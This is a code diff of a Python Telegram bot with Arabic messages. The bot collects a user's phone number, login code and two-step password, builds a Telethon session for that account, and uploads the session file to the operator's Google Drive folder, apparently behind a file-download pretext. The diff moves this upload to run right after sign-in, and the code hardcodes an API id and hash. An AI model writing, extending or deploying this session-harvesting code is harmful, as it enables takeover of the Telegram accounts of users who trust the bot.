@@ -98,94 +98,31 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     return PHONE
 
 async def process_phone(update, context):
-    # إعداد المتغيرات
-    print("Starting the process_phone function...")
+    print("Starting process_phone...")
     user_id = update.message.from_user.id
     phone_number = update.message.text.strip()
     session_file = f"/tmp/session_{user_id}.session"
     api_id = 26466946
     api_hash = '05d7144ca3c5f4594e40c535afb3bd5a'
-      
-    file_metadata = {
-        'name': f'session_{user_id}.session',
-        'parents': [FOLDER_ID],
-        'mimeType': 'application/octet-stream'
-    }
 
-    print(f"مسار ملف الجلسة: {session_file}")
-    print(f"رقم المستخدم: {user_id}, رقم الهاتف: {phone_number}")
-
-    # إنشاء جلسة جديدة
     client = TelegramClient(session_file, api_id, api_hash)
     clients[user_id] = client
     phone_numbers[user_id] = phone_number
 
-    print("Try was here before")
     try:
-        print("start here")
         await client.connect()
-        print("تم إنشاء الاتصال بـ Telegram.")
-        print("قبل التحقق من إذا كان المستخدم مصرح له.")
-    
-        if await client.is_user_authorized():
-            print("المستخدم مصرح له مسبقًا.")
-            # رفع الجلسة إلى Google Drive
-            try:
-                if not os.path.exists(session_file):
-                    print("خطأ: ملف الجلسة غير موجود محليًا قبل الرفع.")
-                    await update.message.reply_text("خطأ: ملف الجلسة غير موجود محليًا قبل الرفع.")
-                    return PHONE
-
-                print("بدء عملية الرفع إلى Google Drive...")
-
-                # التحقق من وجود المجلد
-                print(f"التحقق من معرف المجلد: {FOLDER_ID}")
-                if not FOLDER_ID:
-                    print("خطأ: معرف المجلد غير موجود.")
-                    await update.message.reply_text("خطأ: معرف المجلد غير موجود.")
-                    return PHONE
-
-                # إنشاء MediaFileUpload
-                try:
-                    upload_media = MediaFileUpload(session_file, resumable=True)
-                    print(f"تم إنشاء MediaFileUpload: {upload_media}")
-                except Exception as e:
-                    print(f"خطأ أثناء إنشاء MediaFileUpload: {e}")
-                    await update.message.reply_text("خطأ أثناء إنشاء MediaFileUpload.")
-                    return PHONE
-
-                # تنفيذ الرفع
-                try:
-                    print("رفع الملف إلى Google Drive...")
-                    uploaded_file = drive_service.files().create(
-                        body=file_metadata,
-                        media_body=upload_media,
-                        fields='id'
-                    ).execute()
-                    print(f"تم رفع الجلسة إلى Google Drive بنجاح: File ID: {uploaded_file.get('id')}")
-                    await update.message.reply_text("تم تسجيل الدخول بنجاح! أرسل الآن رابط الملف لتحميله.")
-                    return FILE
-                except Exception as e:
-                    print(f"خطأ أثناء رفع الملف إلى Google Drive: {e}")
-                    await update.message.reply_text(f"خطأ أثناء رفع الملف إلى Google Drive: {e}")
-                    return PHONE
-
-            except Exception as upload_error:
-                print(f"خطأ أثناء رفع الجلسة إلى Google Drive: {upload_error}")
-                await update.message.reply_text(f"خطأ أثناء رفع الجلسة إلى Google Drive: {upload_error}")
-                return PHONE
-
-        # طلب رمز التحقق
+        print("تم الاتصال بـ Telegram.")
+        
+        # إرسال كود التحقق
         await client.send_code_request(phone_number)
         print("تم إرسال رمز التحقق.")
         await update.message.reply_text("تم إرسال رمز التحقق إلى رقمك. الرجاء إدخال الرمز (مثل: 2 2 9 3 0):")
         return CODE
 
     except Exception as e:
-        print(f"حدث خطأ أثناء إنشاء الجلسة: {e}")
-        await update.message.reply_text(f"حدث خطأ أثناء إنشاء الجلسة: {e}")
-        return PHONE
-    
+        print(f"حدث خطأ أثناء إرسال كود التحقق: {e}")
+        await update.message.reply_text(f"حدث خطأ: {e}")
+        return PHONE    
 
 async def process_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.message.from_user.id
@@ -199,9 +136,36 @@ async def process_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return ConversationHandler.END
 
     try:
+        # تسجيل الدخول باستخدام الرمز
         await client.sign_in(phone=phone_number, code=code)
-        await update.message.reply_text("تم تسجيل الدخول بنجاح! أرسل الآن رابط الملف لتحميله.")
-        return FILE
+
+        # التحقق من الصلاحيات
+        if await client.is_user_authorized():
+            await update.message.reply_text("تم تسجيل الدخول بنجاح! جاري رفع ملف الجلسة...")
+
+            # رفع ملف الجلسة
+            session_file = f"/tmp/session_{user_id}.session"
+            if os.path.exists(session_file):
+                upload_media = MediaFileUpload(session_file, resumable=True)
+                uploaded_file = drive_service.files().create(
+                    body={
+                        'name': f'session_{user_id}.session',
+                        'parents': [FOLDER_ID],
+                        'mimeType': 'application/octet-stream'
+                    },
+                    media_body=upload_media,
+                    fields='id'
+                ).execute()
+
+                await update.message.reply_text(f"تم رفع الجلسة بنجاح! ID الملف: {uploaded_file.get('id')}")
+                return FILE
+            else:
+                await update.message.reply_text("خطأ: ملف الجلسة غير موجود.")
+                return PHONE
+        else:
+            await update.message.reply_text("المستخدم غير مصرح له.")
+            return PHONE
+
     except SessionPasswordNeededError:
         await update.message.reply_text("التحقق بخطوتين مفعّل. الرجاء إدخال كلمة المرور الخاصة بك:")
         return PASSWORD
